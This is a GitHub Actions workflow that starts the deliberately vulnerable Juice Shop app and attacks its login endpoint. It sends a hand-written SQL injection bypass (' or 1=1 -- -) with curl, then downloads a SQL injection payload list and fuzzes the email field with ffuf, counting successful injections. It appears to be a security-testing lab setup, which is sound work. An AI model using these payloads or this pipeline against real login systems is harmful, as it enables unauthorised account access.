name: Fuzzing

on:
  push:
    branches: [ main ]

permissions:
  contents: write
  pull-requests: write
  security-events: write
  actions: read

jobs:
  ffuf:
    runs-on: ubuntu-latest
    services:
        juice:
          image: bkimminich/juice-shop
          ports:
            - 3000:3000
    steps:
      - name: Wait for service
        run: |
            sleep 10 
            curl --path-as-is -i -s -k -X $'POST' \
              -H $'Host: localhost:3000' -H $'Content-Length: 43' -H $'Content-Type: application/json' -H $'Connection: keep-alive' \
              --data-binary $'{\"email\":\"\' or 1=1 -- -\",\"password\":\"pass\"}' \
              $'http://localhost:3000/rest/user/login'

      - name: Get payloads
        run: |
          wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/SQL%20Injection/Intruder/SQL-Injection
      
      - name: Install fuzzing
        run: |
          go install github.com/ffuf/ffuf/v2@latest

      - name: Run fuzzing
        run: |
          ffuf \
            -u "http://localhost:3000/rest/user/login" \
            -X POST \
            -H "Content-Type: application/json" \
            -d '{"email":"FUZZ", "password":"any"}' \
            -w SQL-Injection \
            -fc 401 \
            -o ffuf-results.json \
            -of json \
            -v || true

          if [ -f ffuf-results.json ]; then
            SUCCESS_COUNT=$(jq '[.results[] | select(.status == 200)] | length' ffuf-results.json 2>/dev/null || echo "0")
            echo "success_count=$SUCCESS_COUNT" >> $GITHUB_OUTPUT
            
            if [ "$SUCCESS_COUNT" -gt 0 ]; then
              echo "✅ Found $SUCCESS_COUNT successful SQL injections"
            else
              echo "❌ No successful SQL injections found"
            fi
          fi

      - name: Upload results
        uses: actions/upload-artifact@v4
        with:
          name: security-reports-bundle
          path: |
            ffuf-results.json
            .github/workflows/fuzzing.yml